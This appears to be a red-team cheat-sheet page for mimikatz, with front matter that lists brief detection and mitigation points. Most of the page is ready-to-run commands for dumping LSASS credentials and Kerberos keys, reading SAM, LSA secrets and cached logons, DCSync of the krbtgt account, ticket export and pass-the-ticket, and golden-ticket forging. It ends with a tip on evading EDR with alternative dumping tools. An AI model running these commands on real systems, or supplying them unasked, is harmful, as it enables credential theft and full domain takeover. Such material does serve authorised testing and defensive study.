---
title: mimikatz
category: AD / Windows tooling
order: 30
tags: [mimikatz, lsass, dcsync, golden-ticket, dpapi, windows]
summary: >
  The reference tool for extracting Windows secrets and forging Kerberos tickets:
  LSASS creds & Kerberos keys, local SAM/LSA, DCSync, golden/silver tickets, DPAPI.
  Heavily signatured — expect EDR.
prerequisites:
  - Local administrator / SYSTEM on the host (elevation) for most modules
tools: [mimikatz, pypykatz (Linux port)]
detection:
  - LSASS access by non-AV processes; known mimikatz signatures; 4662 (DCSync) from a non-DC
mitigation:
  - LSASS PPL + Credential Guard; EDR; Protected Users; disable WDigest
refs:
  - { label: "mimikatz", url: "https://github.com/gentilkiwi/mimikatz" }
  - { label: "adsecurity — mimikatz", url: "https://adsecurity.org/?page_id=1821" }
---

```
privilege::debug
```

## Credentials from LSASS

```
sekurlsa::logonpasswords
sekurlsa::ekeys              # Kerberos AES keys (for overpass-the-hash)
sekurlsa::dpapi             # DPAPI master keys of live sessions
```

## Local secrets

```
lsadump::sam                # local account hashes
lsadump::secrets            # LSA secrets (service creds, cached)
lsadump::cache              # cached domain logons (MSCACHE)
```

## DCSync (needs replication rights)

```
lsadump::dcsync /domain:$domain /user:krbtgt
```

## Tickets

```
sekurlsa::tickets /export
kerberos::ptt ticket.kirbi
# golden ticket (needs krbtgt hash + domain SID)
kerberos::golden /user:administrator /domain:$domain /sid:$domain_sid /krbtgt:<hash> /ptt
```

> mimikatz is one of the most-signatured tools in existence — on an EDR-monitored
> host prefer `nanodump`/`lsassy` for the LSASS dump and parse offline with
> `pypykatz`, and forge tickets with Rubeus/impacket.
